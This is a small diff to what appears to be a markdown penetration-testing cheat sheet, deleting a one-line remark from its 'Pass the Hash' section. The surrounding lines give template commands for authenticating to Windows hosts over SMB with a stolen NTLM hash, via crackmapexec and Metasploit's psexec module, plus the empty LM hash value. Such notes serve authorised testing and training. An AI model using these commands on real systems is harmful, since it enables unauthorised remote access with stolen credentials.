@@ -112,7 +112,6 @@ Note: if you have a valid user credential you can authenticate in windows target
 <details>
 <summary>$\huge{\text{Pass the Hash}}$</summary>
 
-Useful for persinstence...
 1) `crackmapexec smb <ip> -u <administrator> -H <NTLM hash> -x "ipconfig"`
 2) Metasploit : windows/smb/psexec and set SMBPass with `<LM hash>:<NTLM hash>`
    - empty LM hash : `AAD3B435B51404EEAAD3B435B51404EE` (means its non-use).
